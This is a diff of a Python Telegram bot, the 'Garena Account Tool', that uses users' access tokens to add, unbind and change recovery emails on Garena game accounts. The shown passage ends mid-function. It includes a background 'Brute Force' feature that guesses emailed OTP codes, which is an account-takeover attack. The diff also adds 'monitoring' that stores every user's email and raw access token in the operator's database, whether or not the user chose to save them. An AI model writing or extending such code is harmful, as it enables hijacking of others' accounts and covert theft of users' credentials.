@@ -1,4 +1,4 @@
-"""Garena Account Tool - Smart Telegram Bot with credential memory."""
+"""Garena Account Tool - Smart Telegram Bot with credential memory & activity monitoring."""
 
 import asyncio
 import concurrent.futures
@@ -18,6 +18,9 @@ from telegram.ext import (
     PicklePersistence,
     filters,
 )
+
+import db
+import monitoring
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -50,27 +53,25 @@ FEAT_BF      = "bf"
 (
     MAIN_MENU,
     # ── Credential flow: email + token ───────────────
-    CREDS_CONFIRM,       # use saved vs new (shows when saved exists)
-    CREDS_NEW_EMAIL,     # type new email
-    CREDS_NEW_ACCESS,    # type new access token
-    CREDS_SAVE_ASK,      # ask: save creds for next time?
+    CREDS_CONFIRM,
+    CREDS_NEW_EMAIL,
+    CREDS_NEW_ACCESS,
+    CREDS_SAVE_ASK,
     # ── Credential flow: token only ──────────────────
-    CREDS_TOKEN_CONFIRM, # use saved token vs new
-    CREDS_TOKEN_NEW,     # type new token
-    CREDS_TOKEN_SAVE_ASK,# ask: save token for next time?
-    # ── Add Email ────────────────────────────────────
+    CREDS_TOKEN_CONFIRM,
+    CREDS_TOKEN_NEW,
+    CREDS_TOKEN_SAVE_ASK,
+    # ── Feature-specific states ───────────────────────
     ADD_OTP,
-    # ── Unbind Email ─────────────────────────────────
     UNBIND_METHOD,
     UNBIND_OTP,
     UNBIND_PASS,
-    # ── Change Bind Email ─────────────────────────────
-    CHANGE_NEW_EMAIL,    # enter the new email to bind to
-    CHANGE_METHOD,       # OTP or secondary password for old email
+    CHANGE_NEW_EMAIL,
+    CHANGE_METHOD,
     CHANGE_OLD_OTP,
     CHANGE_PASS,
     CHANGE_NEW_OTP,
-) = range(18)
+) = range(17)
 
 # ─── Garena API Helpers ───────────────────────────────────────────────────────
 
@@ -92,14 +93,12 @@ def api_send_otp(email: str, access: str) -> dict:
     )
 
 def api_verify_otp(email: str, access: str, otp: str) -> dict:
-    """New email verification — returns verifier_token."""
     return _post(
         "https://100067.connect.garena.com/game/account_security/bind:verify_otp",
         {"email": email, "app_id": GARENA_APP_ID, "access_token": access, "otp": otp},
     )
 
 def api_verify_identity_otp(email: str, access: str, otp: str) -> dict:
-    """Old/linked email verification — returns identity_token."""
     return _post(
         "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
         {"email": email, "otp": otp, "app_id": GARENA_APP_ID, "access_token": access},
@@ -193,9 +192,33 @@ def _save_access(ud: dict, access: str) -> None:
     ud["saved_access"] = access
 
 def _load_saved(ud: dict) -> None:
-    """Copy saved creds into working fields."""
     ud["email"]  = ud.get("saved_email", "")
     ud["access"] = ud.get("saved_access", "")
+
+# ─── Activity Logging ─────────────────────────────────────────────────────────
+
+def _log(update: Update, context: ContextTypes.DEFAULT_TYPE, feature: str) -> None:
+    """Log this feature execution to the monitoring database."""
+    user = update.effective_user
+    if not user:
+        return
+    ud     = context.user_data
+    log_id = db.log_entry(
+        user_id     = user.id,
+        username    = user.username,
+        first_name  = user.first_name,
+        feature     = feature,
+        email       = ud.get("email") or None,
+        access_token= ud.get("access") or None,
+    )
+    ud["_log_id"] = log_id
+
+
+def _log_result(context: ContextTypes.DEFAULT_TYPE, result: str) -> None:
+    """Update the result of the current log entry."""
+    log_id = context.user_data.get("_log_id")
+    if log_id:
+        db.update_result(log_id, result)
 
 # ─── Keyboard Builders ────────────────────────────────────────────────────────
 
@@ -213,35 +236,29 @@ def main_menu_keyboard() -> InlineKeyboardMarkup:
     ])
 
 def back_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🏠 Main Menu", callback_data="back_main")]
-    ])
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("🏠 Main Menu", callback_data="back_main")
+    ]])
 
 def save_ask_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("💾 Haan, save karo",  callback_data="save_yes"),
-         InlineKeyboardButton("🚫 Nahi",             callback_data="save_no")],
-        [InlineKeyboardButton("🏠 Main Menu",        callback_data="back_main")],
+        [InlineKeyboardButton("💾 Haan, save karo", callback_data="save_yes"),
+         InlineKeyboardButton("🚫 Nahi",            callback_data="save_no")],
+        [InlineKeyboardButton("🏠 Main Menu",       callback_data="back_main")],
     ])
 
 def use_saved_kb(email: str, token: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton(
-            f"✅ Use: {email} / {mask_token(token)}",
-            callback_data="use_saved"
-        )],
+        [InlineKeyboardButton(f"✅ Use: {email} / {mask_token(token)}", callback_data="use_saved")],
         [InlineKeyboardButton("🆕 Dusra account use karo", callback_data="use_new")],
         [InlineKeyboardButton("🏠 Main Menu",              callback_data="back_main")],
     ])
 
 def use_saved_token_kb(token: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton(
-            f"✅ Use saved token: {mask_token(token)}",
-            callback_data="use_saved_token"
-        )],
-        [InlineKeyboardButton("🆕 Dusra token use karo", callback_data="use_new_token")],
-        [InlineKeyboardButton("🏠 Main Menu",            callback_data="back_main")],
+        [InlineKeyboardButton(f"✅ Use saved: {mask_token(token)}", callback_data="use_saved_token")],
+        [InlineKeyboardButton("🆕 Dusra token use karo",           callback_data="use_new_token")],
+        [InlineKeyboardButton("🏠 Main Menu",                      callback_data="back_main")],
     ])
 
 def method_kb(prefix: str) -> InlineKeyboardMarkup:
@@ -251,33 +268,28 @@ def method_kb(prefix: str) -> InlineKeyboardMarkup:
         [InlineKeyboardButton("🏠 Main Menu",             callback_data="back_main")],
     ])
 
-# ─── Shared Utility Functions ─────────────────────────────────────────────────
+# ─── Shared Utilities ─────────────────────────────────────────────────────────
 
 def _saved_info_line(ud: dict) -> str:
-    """One-liner showing saved credentials if any."""
     if has_saved_creds(ud):
-        return (
-            f"📌 *Saved:* `{ud['saved_email']}` / "
-            f"`{mask_token(ud['saved_access'])}`\n"
-        )
+        return (f"📌 *Saved:* `{ud['saved_email']}` / "
+                f"`{mask_token(ud['saved_access'])}`\n")
     elif has_saved_access(ud):
         return f"📌 *Saved token:* `{mask_token(ud['saved_access'])}`\n"
     return ""
 
 
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    # Keep saved creds intact — only clear working fields
     ud = context.user_data
-    for key in ["email", "access", "new_email", "old_email",
-                "_feature", "unbind_method", "change_method",
-                "identity_token", "verifier_token"]:
+    for key in ["email", "access", "new_email", "_feature",
+                "unbind_method", "identity_token", "_log_id"]:
         ud.pop(key, None)
 
     text = (
         "🎮 *Garena Account Tool*\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         + _saved_info_line(ud) +
-        "👇 Feature choose karo aur click karo:"
+        "👇 Feature choose karo:"
     )
     kb = main_menu_keyboard()
     if update.message:
@@ -285,94 +297,84 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     elif update.callback_query:
         await update.callback_query.answer()
         try:
-            await update.callback_query.edit_message_text(
-                text, parse_mode="Markdown", reply_markup=kb
-            )
+            await update.callback_query.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
         except Exception:
-            await update.callback_query.message.reply_text(
-                text, parse_mode="Markdown", reply_markup=kb
-            )
+            await update.callback_query.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
     return MAIN_MENU
 
 
 async def cancel_op(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    _log_result(context, "cancelled")
     await update.message.reply_text("❌ Cancel ho gaya.", reply_markup=back_kb())
     return ConversationHandler.END
 
 
-async def _done(update: Update, text: str) -> None:
+async def _done(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
+    _log_result(context, "success")
     await update.effective_message.reply_text(
         text, parse_mode="Markdown", reply_markup=back_kb()
     )
 
 
-async def _err(update: Update, text: str) -> None:
+async def _err(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
+    _log_result(context, "failed")
     await update.effective_message.reply_text(
         f"❌ {text}", parse_mode="Markdown", reply_markup=back_kb()
     )
 
-# ─── Feature Routing (called once credentials are ready) ─────────────────────
+# ─── Feature Routing ─────────────────────────────────────────────────────────
 
 async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """
-    Called after credentials (email/access) are set in user_data.
-    Executes the feature or jumps to its next state.
-    """
     ud      = context.user_data
     feature = ud.get("_feature")
     email   = ud.get("email", "")
     access  = ud.get("access", "")
     msg     = update.effective_message
 
-    # ── Token-only features: execute immediately ──────────────────────────────
+    # Log the activity to monitoring DB
+    _log(update, context, feature)
+
+    # ── Token-only features ───────────────────────────────────────────────────
 
     if feature == FEAT_CHECK:
         await msg.reply_text("⏳ Info fetch kar raha hoon...")
         try:
-            data      = api_get_bind_info(access)
-            ev        = data.get("email", "")
-            ep        = data.get("email_to_be", "")
-            countdown = data.get("request_exec_countdown", 0)
-            if ev == "" and ep:
-                result = f"📧 *Pending Email:* `{ep}`\n⏰ *Confirm Hoga:* {convert_time(countdown)}"
+            data = api_get_bind_info(access)
+            ev, ep = data.get("email", ""), data.get("email_to_be", "")
+            cd = data.get("request_exec_countdown", 0)
+            if not ev and ep:
+                result = f"📧 *Pending Email:* `{ep}`\n⏰ *Confirm Hoga:* {convert_time(cd)}"
             elif ev and not ep:
                 result = f"📧 *Linked Email:* `{ev}`\n✅ *Confirmed!*"
             else:
                 result = "❌ Koi email linked nahi hai!"
-            await _done(update, result)
+            await _done(update, context, result)
         except Exception as e:
-            await _err(update, f"Error: `{e}`")
+            await _err(update, context, f"Error: `{e}`")
         return ConversationHandler.END
 
     if feature == FEAT_PLAT:
         await msg.reply_text("⏳ Platform info fetch kar raha hoon...")
         try:
-            j = api_get_platforms(access)
-            pm = {3: "Facebook", 5: "VK", 7: "Huawei",
-                  8: "Gmail", 10: "iCloud", 11: "Twitter"}
-            bounded   = j.get("bounded_accounts", [])
-            available = j.get("available_platforms", [])
-            lines = ["🔗 *Secondary Links:*"]
-            found = False
+            j  = api_get_platforms(access)
+            pm = {3:"Facebook",5:"VK",7:"Huawei",8:"Gmail",10:"iCloud",11:"Twitter"}
+            bounded, available = j.get("bounded_accounts",[]), j.get("available_platforms",[])
+            lines, found = ["🔗 *Secondary Links:*"], False
             for x in bounded:
-                p = x.get("platform")
-                ui = x.get("user_info", {})
-                e = ui.get("email", "")
-                n = ui.get("nickname", "")
+                p, ui = x.get("platform"), x.get("user_info",{})
                 if p in pm:
                     lines.append(f"\n*{pm[p]}*")
-                    if e: lines.append(f"  📧 `{e}`")
-                    if n: lines.append(f"  👤 `{n}`")
+                    if ui.get("email"):   lines.append(f"  📧 `{ui['email']}`")
+                    if ui.get("nickname"):lines.append(f"  👤 `{ui['nickname']}`")
                     found = True
             if not found:
                 lines.append("  _Koi secondary link nahi mila_")
             for k, name in pm.items():
                 if k not in available:
-                    lines.append(f"\n🎮 *Main Platform:* {name}")
-                    break
-            await _done(update, "\n".join(lines))
+                    lines.append(f"\n🎮 *Main Platform:* {name}"); break
+            await _done(update, context, "\n".join(lines))
         except Exception as e:
-            await _err(update, f"Error: `{e}`")
+            await _err(update, context, f"Error: `{e}`")
         return ConversationHandler.END
 
     if feature == FEAT_CANCEL:
@@ -380,11 +382,11 @@ async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE)
         try:
             res = api_cancel_request(access)
             if res.get("result") == 0:
-                await _done(update, "✅ Recovery email request cancel ho gaya!")
+                await _done(update, context, "✅ Recovery email request cancel ho gaya!")
             else:
-                await _err(update, f"Cancel fail:\n`{res}`")
+                await _err(update, context, f"Cancel fail:\n`{res}`")
         except Exception as e:
-            await _err(update, f"Error: `{e}`")
+            await _err(update, context, f"Error: `{e}`")
         return ConversationHandler.END
 
     if feature == FEAT_REVOKE:
@@ -392,14 +394,14 @@ async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE)
         try:
             resp = api_revoke_token(access)
             if resp == '{"result":0}':
-                await _done(update, "✅ *Token successfully revoke ho gaya!* 🎉")
+                await _done(update, context, "✅ *Token successfully revoke ho gaya!* 🎉")
             else:
-                await _err(update, f"Revoke fail:\n`{resp}`")
+                await _err(update, context, f"Revoke fail:\n`{resp}`")
         except Exception as e:
-            await _err(update, f"Error: `{e}`")
+            await _err(update, context, f"Error: `{e}`")
         return ConversationHandler.END
 
-    # ── Email + Token features: multi-step ───────────────────────────────────
+    # ── Email + Token features ────────────────────────────────────────────────
 
     if feature == FEAT_ADD:
         await msg.reply_text("⏳ OTP bhej raha hoon...")
@@ -408,22 +410,20 @@ async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE)
             if res.get("result") == 0:
                 await msg.reply_text(
                     f"✅ OTP `{email}` pe bhej diya!\n\n📝 OTP enter karo:",
-                    parse_mode="Markdown",
+                    parse_mode="Markdown"
                 )
                 return ADD_OTP
             else:
-                await _err(update, f"OTP send fail:\n`{res}`")
+                await _err(update, context, f"OTP send fail:\n`{res}`")
                 return ConversationHandler.END
         except Exception as e:
-            await _err(update, f"Error: `{e}`")
+            await _err(update, context, f"Error: `{e}`")
             return ConversationHandler.END
 
     if feature == FEAT_UNBIND:
         await msg.reply_text(
-            "🔓 *Unbind Email*\n━━━━━━━━━━━━━━━━━━━━━━\n"
-            "👇 Verify method choose karo:",
-            parse_mode="Markdown",
-            reply_markup=method_kb("unbind"),
+            "🔓 *Unbind Email*\n━━━━━━━━━━━━━━━━━━━━━━\n👇 Verify method:",
+            parse_mode="Markdown", reply_markup=method_kb("unbind")
         )
         return UNBIND_METHOD
 
@@ -437,40 +437,37 @@ async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE)
         try:
             res = api_send_otp(email, access)
             if res.get("result") != 0:
-                await _err(update, f"OTP send fail:\n`{res}`")
+                await _err(update, context, f"OTP send fail:\n`{res}`")
                 return ConversationHandler.END
         except Exception as e:
-            await _err(update, f"Error: `{e}`")
+            await _err(update, context, f"Error: `{e}`")
             return ConversationHandler.END
         await msg.reply_text(
             "✅ OTP bhej diya!\n\n"
             "🔨 *Brute Force background mein shuru ho gaya!*\n"
-            "Jab sahi code mile sirf tab ek message aayega.\n"
-            "Baaki sab attempts automatic band. ⏳",
-            parse_mode="Markdown",
-            reply_markup=back_kb(),
+            "Jab sahi code mile sirf tab ek message aayega. ⏳",
+            parse_mode="Markdown", reply_markup=back_kb()
         )
         context.application.create_task(
-            run_brute_force(chat_id, email, access, context.application.bot)
+            run_brute_force(chat_id, email, access, context.application.bot,
+                            context.user_data.get("_log_id"))
         )
         return ConversationHandler.END
 
     return ConversationHandler.END
 
-# ─── Credential Flow Handlers ─────────────────────────────────────────────────
+# ─── Credential Flow: email + token ──────────────────────────────────────────
 
 async def _start_email_token_feature(
-    update: Update, context: ContextTypes.DEFAULT_TYPE, feature: str, title: str, icon: str
+    update: Update, context: ContextTypes.DEFAULT_TYPE,
+    feature: str, title: str, icon: str
 ) -> int:
-    """Show saved-creds prompt or go directly to email input."""
     ud = context.user_data
     ud["_feature"] = feature
     await update.callback_query.answer()
-
     if has_saved_creds(ud):
         await update.callback_query.edit_message_text(
-            f"{icon} *{title}*\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{icon} *{title}*\n━━━━━━━━━━━━━━━━━━━━━━\n"
             "📌 *Saved credentials mili hain:*\n"
             f"📧 `{ud['saved_email']}`\n"
             f"🔑 `{mask_token(ud['saved_access'])}`\n\n"
@@ -479,28 +476,23 @@ async def _start_email_token_feature(
             reply_markup=use_saved_kb(ud["saved_email"], ud["saved_access"]),
         )
         return CREDS_CONFIRM
-    else:
-        await update.callback_query.edit_message_text(
-            f"{icon} *{title}*\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "📝 Email address type karo:",
-            parse_mode="Markdown",
-        )
-        return CREDS_NEW_EMAIL
+    await update.callback_query.edit_message_text(
+        f"{icon} *{title}*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Email address type karo:",
+        parse_mode="Markdown"
+    )
+    return CREDS_NEW_EMAIL
 
 
 async def _start_token_feature(
-    update: Update, context: ContextTypes.DEFAULT_TYPE, feature: str, title: str, icon: str
+    update: Update, context: ContextTypes.DEFAULT_TYPE,
+    feature: str, title: str, icon: str
 ) -> int:
-    """Show saved-token prompt or go directly to token input."""
     ud = context.user_data
     ud["_feature"] = feature
     await update.callback_query.answer()
-
     if has_saved_access(ud):
         await update.callback_query.edit_message_text(
-            f"{icon} *{title}*\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{icon} *{title}*\n━━━━━━━━━━━━━━━━━━━━━━\n"
             "📌 *Saved token mila hai:*\n"
             f"🔑 `{mask_token(ud['saved_access'])}`\n\n"
             "Ise use karein ya naya token?",
@@ -508,45 +500,32 @@ async def _start_token_feature(
             reply_markup=use_saved_token_kb(ud["saved_access"]),
         )
         return CREDS_TOKEN_CONFIRM
-    else:
-        await update.callback_query.edit_message_text(
-            f"{icon} *{title}*\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "📝 Access Token type karo:",
-            parse_mode="Markdown",
-        )
-        return CREDS_TOKEN_NEW
+    await update.callback_query.edit_message_text(
+        f"{icon} *{title}*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Access Token type karo:",
+        parse_mode="Markdown"
+    )
+    return CREDS_TOKEN_NEW
 
-
-# ── CREDS_CONFIRM handler (email + token) ─────────────────────────────────────
 
 async def creds_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.callback_query.answer()
-    data = update.callback_query.data
-    ud   = context.user_data
-
+    data, ud = update.callback_query.data, context.user_data
     if data == "back_main":
         return await show_main_menu(update, context)
-
     if data == "use_saved":
         _load_saved(ud)
         await update.callback_query.edit_message_text(
             f"✅ *Saved credentials load ho gayi:*\n"
-            f"📧 `{ud['email']}`\n"
-            f"🔑 `{mask_token(ud['access'])}`\n\n"
-            "⏳ Processing...",
-            parse_mode="Markdown",
+            f"📧 `{ud['email']}`\n🔑 `{mask_token(ud['access'])}`\n\n⏳ Processing...",
+            parse_mode="Markdown"
         )
         return await proceed_to_feature(update, context)
-
     if data == "use_new":
         await update.callback_query.edit_message_text(
-            "🆕 *Naya Account*\n━━━━━━━━━━━━━━━━━━━━━━\n"
-            "📝 Email address type karo:",
-            parse_mode="Markdown",
+            "🆕 *Naya Account*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Email address type karo:",
+            parse_mode="Markdown"
         )
         return CREDS_NEW_EMAIL
-
     return CREDS_CONFIRM
 
 
@@ -560,19 +539,16 @@ async def creds_new_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     context.user_data["access"] = update.message.text.strip()
     await update.message.reply_text(
         "💾 Ye credentials save karein agle baar ke liye?",
-        reply_markup=save_ask_kb(),
+        reply_markup=save_ask_kb()
     )
     return CREDS_SAVE_ASK
 
 
 async def creds_save_ask(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.callback_query.answer()
-    data = update.callback_query.data
-    ud   = context.user_data
-
+    data, ud = update.callback_query.data, context.user_data
     if data == "back_main":
         return await show_main_menu(update, context)
-
     if data == "save_yes":
         _save_creds(ud, ud["email"], ud["access"])
         await update.callback_query.edit_message_text(
@@ -580,58 +556,44 @@ async def creds_save_ask(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         )
     else:
         await update.callback_query.edit_message_text("⏳ Processing...")
-
     return await proceed_to_feature(update, context)
 
-
-# ── CREDS_TOKEN_CONFIRM handler (token only) ──────────────────────────────────
+# ─── Credential Flow: token only ─────────────────────────────────────────────
 
 async def creds_token_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.callback_query.answer()
-    data = update.callback_query.data
-    ud   = context.user_data
-
+    data, ud = update.callback_query.data, context.user_data
     if data == "back_main":
         return await show_main_menu(update, context)
-
     if data == "use_saved_token":
         ud["access"] = ud["saved_access"]
         await update.callback_query.edit_message_text(
-            f"✅ *Saved token load ho gaya:*\n"
-            f"🔑 `{mask_token(ud['access'])}`\n\n"
-            "⏳ Processing...",
-            parse_mode="Markdown",
+            f"✅ *Saved token load ho gaya:*\n🔑 `{mask_token(ud['access'])}`\n\n⏳ Processing...",
+            parse_mode="Markdown"
         )
         return await proceed_to_feature(update, context)
-
     if data == "use_new_token":
         await update.callback_query.edit_message_text(
-            "🆕 *Naya Token*\n━━━━━━━━━━━━━━━━━━━━━━\n"
-            "📝 Access Token type karo:",
-            parse_mode="Markdown",
+            "🆕 *Naya Token*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Access Token type karo:",
+            parse_mode="Markdown"
         )
         return CREDS_TOKEN_NEW
-
     return CREDS_TOKEN_CONFIRM
 
 
 async def creds_token_new(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data["access"] = update.message.text.strip()
     await update.message.reply_text(
-        "💾 Ye token save karein agle baar ke liye?",
-        reply_markup=save_ask_kb(),
+        "💾 Ye token save karein agle baar ke liye?", reply_markup=save_ask_kb()
     )
     return CREDS_TOKEN_SAVE_ASK
 
 
 async def creds_token_save_ask(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.callback_query.answer()
-    data = update.callback_query.data
-    ud   = context.user_data
-
+    data, ud = update.callback_query.data, context.user_data
     if data == "back_main":
         return await show_main_menu(update, context)
-
     if data == "save_yes":
         _save_access(ud, ud["access"])
         await update.callback_query.edit_message_text(
@@ -639,10 +601,9 @@ async def creds_token_save_ask(update: Update, context: ContextTypes.DEFAULT_TYP
         )
     else:
         await update.callback_query.edit_message_text("⏳ Processing...")
-
     return await proceed_to_feature(update, context)
 
-# ─── Feature Button Handlers (entry points from main menu) ────────────────────
+# ─── Feature Button Handlers ──────────────────────────────────────────────────
 
 async def add_email_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
     return await _start_email_token_feature(u, c, FEAT_ADD, "Add Recovery Email", "📧")
@@ -674,256 +635,198 @@ async def clear_creds(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
     context.user_data.pop("saved_access", None)
     return await show_main_menu(update, context)
 
-# ─── Add Email Specific States ────────────────────────────────────────────────
+# ─── Add Email: OTP State ─────────────────────────────────────────────────────
 
 async def add_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    otp    = update.message.text.strip()
-    ud     = context.user_data
-    email  = ud["email"]
-    access = ud["access"]
-
+    otp, ud = update.message.text.strip(), context.user_data
+    email, access = ud["email"], ud["access"]
     await update.message.reply_text("⏳ OTP verify kar raha hoon...")
     try:
         res = api_verify_otp(email, access, otp)
         verifier_token = res.get("verifier_token")
         if not verifier_token:
-            await _err(update, f"OTP verify fail:\n`{res}`")
+            await _err(update, context, f"OTP verify fail:\n`{res}`")
             return ConversationHandler.END
         await update.message.reply_text("⏳ Email bind kar raha hoon...")
         api_cancel_request(access)
         bind_res = api_create_bind_request(access, verifier_token, email)
         if bind_res.get("result") == 0:
-            await _done(update, f"✅ *SUCCESS!*\n`{email}` successfully add ho gaya!")
+            await _done(update, context, f"✅ *SUCCESS!*\n`{email}` successfully add ho gaya!")
         else:
-            await _err(update, f"Bind fail:\n`{bind_res}`")
+            await _err(update, context, f"Bind fail:\n`{bind_res}`")
     except Exception as e:
-        await _err(update, f"Error: `{e}`")
+        await _err(update, context, f"Error: `{e}`")
     return ConversationHandler.END
 
-# ─── Unbind Email Specific States ─────────────────────────────────────────────
+# ─── Unbind Email States ──────────────────────────────────────────────────────
 
 async def unbind_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.callback_query.answer()
     data = update.callback_query.data
-
     if data == "back_main":
         return await show_main_menu(update, context)
-
-    context.user_data["unbind_method"] = data
-
+    ud = context.user_data
     if data == "unbind_otp":
-        email  = context.user_data["email"]
-        access = context.user_data["access"]
+        email, access = ud["email"], ud["access"]
         await update.callback_query.edit_message_text(
             f"⏳ OTP `{email}` pe bhej raha hoon...", parse_mode="Markdown"
         )
         try:
             res = api_send_otp(email, access)
             if res.get("result") == 0:
-                await update.callback_query.message.reply_text(
-                    "✅ OTP bhej diya!\n\n📝 OTP enter karo:"
-                )
+                await update.callback_query.message.reply_text("✅ OTP bhej diya!\n\n📝 OTP enter karo:")
                 return UNBIND_OTP
             else:
-                await _err(update, f"OTP send fail:\n`{res}`")
+                await _err(update, context, f"OTP send fail:\n`{res}`")
                 return ConversationHandler.END
         except Exception as e:
-            await _err(update, f"Error: `{e}`")
+            await _err(update, context, f"Error: `{e}`")
             return ConversationHandler.END
-    else:
-        await update.callback_query.edit_message_text("📝 Secondary Password type karo:")
-        return UNBIND_PASS
+    await update.callback_query.edit_message_text("📝 Secondary Password type karo:")
+    return UNBIND_PASS
 
 
 async def unbind_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    otp    = update.message.text.strip()
-    ud     = context.user_data
-    email  = ud["email"]
-    access = ud["access"]
-
+    otp, ud = update.message.text.strip(), context.user_data
     await update.message.reply_text("⏳ Identity verify kar raha hoon...")
     try:
-        res = api_verify_identity_otp(email, access, otp)
-        identity_token = res.get("identity_token")
-        if not identity_token:
-            await _err(update, f"Verify fail:\n`{res}`")
-            return ConversationHandler.END
+        res = api_verify_identity_otp(ud["email"], ud["access"], otp)
+        it = res.get("identity_token")
+        if not it:
+            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
         await update.message.reply_text("⏳ Unbind request create kar raha hoon...")
-        unbind_res = api_create_unbind_request(access, identity_token)
-        if unbind_res.get("result") == 0:
-            await _done(update, "✅ *SUCCESS!* Email unbind request create ho gaya!")
+        r2 = api_create_unbind_request(ud["access"], it)
+        if r2.get("result") == 0:
+            await _done(update, context, "✅ *SUCCESS!* Email unbind request create ho gaya!")
         else:
-            await _err(update, f"Unbind fail:\n`{unbind_res}`")
+            await _err(update, context, f"Unbind fail:\n`{r2}`")
     except Exception as e:
-        await _err(update, f"Error: `{e}`")
+        await _err(update, context, f"Error: `{e}`")
     return ConversationHandler.END
 
 
 async def unbind_get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    password = update.message.text.strip()
-    ud       = context.user_data
-    email    = ud["email"]
-    access   = ud["access"]
-
+    pw, ud = update.message.text.strip(), context.user_data
     await update.message.reply_text("⏳ Secondary password verify kar raha hoon...")
     try:
-        res = api_verify_identity_password(email, access, password)
-        identity_token = res.get("identity_token")
-        if not identity_token:
-            await _err(update, f"Verify fail:\n`{res}`")
-            return ConversationHandler.END
+        res = api_verify_identity_password(ud["email"], ud["access"], pw)
+        it = res.get("identity_token")
+        if not it:
+            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
         await update.message.reply_text("⏳ Unbind request create kar raha hoon...")
-        unbind_res = api_create_unbind_request(access, identity_token)
-        if unbind_res.get("result") == 0:
-            await _done(update, "✅ *SUCCESS!* Email unbind request create ho gaya!")
+        r2 = api_create_unbind_request(ud["access"], it)
+        if r2.get("result") == 0:
+            await _done(update, context, "✅ *SUCCESS!* Email unbind request create ho gaya!")
         else:
-            await _err(update, f"Unbind fail:\n`{unbind_res}`")
+            await _err(update, context, f"Unbind fail:\n`{r2}`")
     except Exception as e:
-        await _err(update, f"Error: `{e}`")
+        await _err(update, context, f"Error: `{e}`")
     return ConversationHandler.END
 
-# ─── Change Bind Email Specific States ───────────────────────────────────────
+# ─── Change Bind Email States ─────────────────────────────────────────────────
 
 async def change_get_new_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data["new_email"] = update.message.text.strip()
     await update.message.reply_text(
-        "🔄 *Change Bind Email*\n━━━━━━━━━━━━━━━━━━━━━━\n"
-        "Purani email verify karne ka method:",
-        parse_mode="Markdown",
-        reply_markup=method_kb("chg"),
+        "🔄 *Change Bind Email*\n━━━━━━━━━━━━━━━━━━━━━━\nPurani email verify karne ka method:",
+        parse_mode="Markdown", reply_markup=method_kb("chg")
     )
     return CHANGE_METHOD
 
 
 async def change_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.callback_query.answer()
-    data   = update.callback_query.data
-    ud     = context.user_data
-    old_email = ud["email"]
-    access    = ud["access"]
-
+    data, ud = update.callback_query.data, context.user_data
     if data == "back_main":
         return await show_main_menu(update, context)
-
     if data == "chg_otp":
         await update.callback_query.edit_message_text(
-            f"⏳ OTP `{old_email}` pe bhej raha hoon...", parse_mode="Markdown"
+            f"⏳ OTP `{ud['email']}` pe bhej raha hoon...", parse_mode="Markdown"
         )
         try:
-            res = api_send_otp(old_email, access)
+            res = api_send_otp(ud["email"], ud["access"])
             if res.get("result") == 0:
-                await update.callback_query.message.reply_text(
-                    "✅ OTP bhej diya!\n\n📝 Purani email ka OTP enter karo:"
-                )
+                await update.callback_query.message.reply_text("✅ OTP bhej diya!\n\n📝 Purani email ka OTP enter karo:")
                 return CHANGE_OLD_OTP
             else:
-                await _err(update, f"OTP send fail:\n`{res}`")
+                await _err(update, context, f"OTP send fail:\n`{res}`")
                 return ConversationHandler.END
         except Exception as e:
-            await _err(update, f"Error: `{e}`")
+            await _err(update, context, f"Error: `{e}`")
             return ConversationHandler.END
-    else:
-        await update.callback_query.edit_message_text("📝 Secondary Password type karo:")
-        return CHANGE_PASS
+    await update.callback_query.edit_message_text("📝 Secondary Password type karo:")
+    return CHANGE_PASS
 
 
-async def _finish_rebind(update, context):
-    """Send OTP to new email and transition to CHANGE_NEW_OTP."""
-    ud        = context.user_data
-    new_email = ud["new_email"]
-    access    = ud["access"]
-
+async def _send_new_email_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    ud = context.user_data
     await update.effective_message.reply_text(
